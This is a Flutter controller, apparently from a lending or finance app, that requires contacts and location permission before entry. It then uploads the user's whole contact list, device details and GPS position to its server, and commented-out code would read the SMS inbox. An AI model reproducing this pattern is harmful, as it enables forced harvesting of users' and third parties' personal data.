import 'dart:convert';
import 'dart:io';

import 'package:contacts_service/contacts_service.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:finovelapp/data/repo/auth/permission_repo.dart';
import 'package:get/get.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:geolocator/geolocator.dart';

import '../../../core/route/route.dart';
import '../../../core/utils/my_strings.dart';
import '../../../views/components/snackbar/show_custom_snackbar.dart';

enum PermissionStatus { granted, denied, notRequested }

class PermissionModel {
  PermissionStatus locationPermission;
  PermissionStatus smsPermission;
  PermissionStatus contactsPermission;

  PermissionModel({
    this.locationPermission = PermissionStatus.notRequested,
    this.smsPermission = PermissionStatus.notRequested,
    this.contactsPermission = PermissionStatus.notRequested,
  });
}


class ContactData {
  final String name;
  final String phone;

  ContactData({required this.name, required this.phone});

  Map<String, dynamic> toJson() {
    return {
      'name': name,
      'phone': phone,
    };
  }
}

class PhoneData {
  final String model;
  final String osVersion;
  final String brand;
  final String device;
  final String manufacturer;
  final String product;
  final String hardware;
  final bool isPhysicalDevice;

  PhoneData({
    required this.model,
    required this.osVersion,
    required this.brand,
    required this.device,
    required this.manufacturer,
    required this.product,
    required this.hardware,
    required this.isPhysicalDevice,
  });

  Map<String, dynamic> toJson() {
    return {
      'model': model,
      'osVersion': osVersion,
      'brand': brand,
      'device': device,
      'manufacturer': manufacturer,
      'product': product,
      'hardware': hardware,
      'isPhysicalDevice': isPhysicalDevice.toString(),
    };
  }
}

class LocationData {
  final double latitude;
  final double longitude;

  LocationData({required this.latitude, required this.longitude});

  Map<String, dynamic> toJson() {
    return {
      'latitude': latitude,
      'longitude': longitude,
    };
  }
}


class PermissionController extends GetxController {
  final PermissionDetailsRepo permissionDetailsRepo;
  PermissionController({required this.permissionDetailsRepo});
  // Define the necessary variables
  bool isLoading = false;

  PermissionModel permissionModel = PermissionModel();

  // Update the loading state
  void setLoading(bool value) {
    isLoading = value;
    update(); // Notify listeners to rebuild
  }



  Future<void> requestAndSendPermissions() async {
  setLoading(true);

  // // Request SMS Permission on Android only
  // if (!Platform.isIOS) {
  //   if (!await _requestSmsPermission()) {
  //     setLoading(false);
  //     return; // Exit if SMS permission is denied
  //   }
  // }

  // Request Contacts Permission
  if (!await _requestContactsPermission()) {
    setLoading(false);
    return; // Exit if Contacts permission is denied
  }

  // Request Location Permission
  if (!await _requestLocationPermission()) {
    setLoading(false);
    return; // Exit if Location permission is denied
  }

  // All permissions granted, proceed to collect and send data

   if (permissionModel.locationPermission == PermissionStatus.granted &&
        permissionModel.contactsPermission == PermissionStatus.granted ) {
      try {
        final data = await _collectAllData();
        print('sending data $data');
        await sendPermissionData(data);
      } catch (e) {
        setLoading(false);
        print("Error collecting or sending data: $e");
        CustomSnackBar.error(errorList: [MyStrings.somethingWentWrong]);
      }
    } else {
      setLoading(false);
      CustomSnackBar.error(errorList: ['One or more permissions are denied']);
      print("One or more permissions are denied");
    }


  setLoading(false);
}


  Future<bool> _requestLocationPermission() async {
    final data = await _determinePosition();
    permissionModel.locationPermission =
        data.latitude != null ? PermissionStatus.granted : PermissionStatus.denied;

    if (permissionModel.locationPermission != PermissionStatus.granted) {
      CustomSnackBar.error(errorList: ['Please grant location permission']);
      return false;
    }
    return true;
  }

  Future<bool> _requestContactsPermission() async {
    if (Platform.isIOS) {
      permissionModel.contactsPermission = PermissionStatus.granted;
      return true;
    }

    var status = await Permission.contacts.request();
    permissionModel.contactsPermission =
        status.isGranted ? PermissionStatus.granted : PermissionStatus.denied;

    if (permissionModel.contactsPermission != PermissionStatus.granted) {
      CustomSnackBar.error(errorList: ['Please grant contact permission']);
      return false;
    }
    return true;
  }

  Future<bool> _requestSmsPermission() async {
    if (Platform.isIOS) {
      permissionModel.smsPermission = PermissionStatus.granted;
      return true;
    }

    var status = await Permission.sms.request();
    permissionModel.smsPermission =
        status.isGranted ? PermissionStatus.granted : PermissionStatus.denied;

    if (permissionModel.smsPermission != PermissionStatus.granted) {
      CustomSnackBar.error(errorList: ['Please grant sms permission']);
      return false;
    }
    return true;
  }

//    Future<void> requestAndSendPermissions() async {
//     setLoading(true);
//   // Check the current permission status
//   final smsPermission = await Permission.sms.status;
//   final contactsPermission = await Permission.contacts.status;
//   final locationPermission = await Permission.location.status;


//   // Create a list of permissions that need to be requested
//   var permissionsToRequest = <Permission>[];
//   if(Platform.isAndroid){
// if (!smsPermission.isGranted) {
//     permissionsToRequest.add(Permission.sms);
//   }
//   }
//   if (!contactsPermission.isGranted) {
//     permissionsToRequest.add(Permission.contacts);
//   }
//   if (contactsPermission.isGranted && !locationPermission.isGranted) {
//     _determinePosition();


//   }

//   // Request permissions
//   if (permissionsToRequest.isNotEmpty) {
//     try {
//       final statuses = await permissionsToRequest.request();
//       if (statuses.values.every((status) => status.isGranted)) {
//          try {
//         // Collect and Send Data
//         final data = await _collectAllData();
//         print('sending data $data');
//         await sendPermissionData(data);
//       } catch (e) {
//         setLoading(false);
//         print("Error collecting or sending data: $e");
//       }

//       } else {
//         setLoading(false);
//         print("One or more permissions are denied");
//       }
//     } on PlatformException catch (e) {
//       setLoading(false);
//       print("Permission request error: ${e.message}");
//     }
//   } else {
//     try {
//        final data = await _collectAllData();
//         print('sending else condition data $data');
//         await sendPermissionData(data);
//         print("All necessary permissions are already granted");
//       }
//     catch (e) {
//         print("Error in data collection: $e");
//       }
//       setLoading(false); // Stop loading when no permissions are needed
//     }

//   }


Future<Position> _determinePosition() async {
  bool serviceEnabled;
  LocationPermission permission;

  // Test if location services are enabled.
  serviceEnabled = await Geolocator.isLocationServiceEnabled();
  if (!serviceEnabled) {
    // Location services are not enabled don't continue
    // accessing the position and request users of the
    // App to enable the location services.
    return Future.error('Location services are disabled.');
  }

  permission = await Geolocator.checkPermission();
  if (permission == LocationPermission.denied) {
    permission = await Geolocator.requestPermission();
    if (permission == LocationPermission.denied) {
      // Permissions are denied, next time you could try
      // requesting permissions again (this is also where
      // Android's shouldShowRequestPermissionRationale
      // returned true. According to Android guidelines
      // your App should show an explanatory UI now.
      return Future.error('Location permissions are denied');
    }
  }

  if (permission == LocationPermission.deniedForever) {
    // Permissions are denied forever, handle appropriately.
    return Future.error(
      'Location permissions are permanently denied, we cannot request permissions.');
  }

  // When we reach here, permissions are granted and we can
  // continue accessing the position of the device.
  return await Geolocator.getCurrentPosition();
}

  Future<Map<String, String>> _collectAllData() async {
  final contactsData = await _collectContactsData();
  final phoneData = await _collectPhoneData();
  final locationData = await _collectLocationData();


  return {
    'contacts': jsonEncode(contactsData),
    'device_info': jsonEncode(phoneData.toJson()),
    "latitude": locationData.latitude.toString(),
    "longitude": locationData.longitude.toString(),
  };
}

  // Future<List<SmsMessage>> _collectSMSData() async {
  //   return telephony.getInboxSms(columns: [SmsColumn.ADDRESS, SmsColumn.BODY, SmsColumn.DATE]);
  // }

 Future<List<ContactData>> _collectContactsData() async {
  final contacts = await ContactsService.getContacts();
  return contacts.map((contact) {
    final name = contact.displayName ?? "No Name";
    final phone = contact.phones?.map((item) => item.value).join(", ") ?? "No Phones";
    return ContactData(name: name, phone: phone);
  }).toList();
}


 Future<PhoneData> _collectPhoneData() async {
  DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
  if (Platform.isAndroid) {
    AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
    return PhoneData(
      model: androidInfo.model,
      osVersion: androidInfo.version.release,
      brand: androidInfo.brand,
      device: androidInfo.device,
      manufacturer: androidInfo.manufacturer,
      product: androidInfo.product,
      hardware: androidInfo.hardware,
      isPhysicalDevice: androidInfo.isPhysicalDevice,
    );
  } else if (Platform.isIOS) {
    IosDeviceInfo iosInfo = await deviceInfo.iosInfo;
    return PhoneData(
      model: iosInfo.utsname.machine,
      osVersion: iosInfo.systemVersion,
      brand: iosInfo.name,
      device: iosInfo.systemName,
      manufacturer: iosInfo.localizedModel,
      product: iosInfo.identifierForVendor??'',
      hardware: "iOS",
      isPhysicalDevice: iosInfo.isPhysicalDevice,
    );
  } else {
    throw Exception('Unsupported platform');
  }
}


 Future<LocationData> _collectLocationData() async {
  final position = await Geolocator.getCurrentPosition();
  return LocationData(latitude: position.latitude, longitude: position.longitude);
}



   Future<void> sendPermissionData(Map<String, String> data) async {
    try {
      final submitted  = await permissionDetailsRepo.submitDeviceData(data);

      if(submitted){
        //  Get.offAllNamed(RouteHelper.bottomNavScreen);
         Get.offAllNamed(RouteHelper.bottomNavScreen);
      }


    } catch (e) {
      CustomSnackBar.error(
        errorList: [MyStrings.somethingWentWrong],
      );
    }
    setLoading(false); // Stop loading after sending data or on error
  }
}
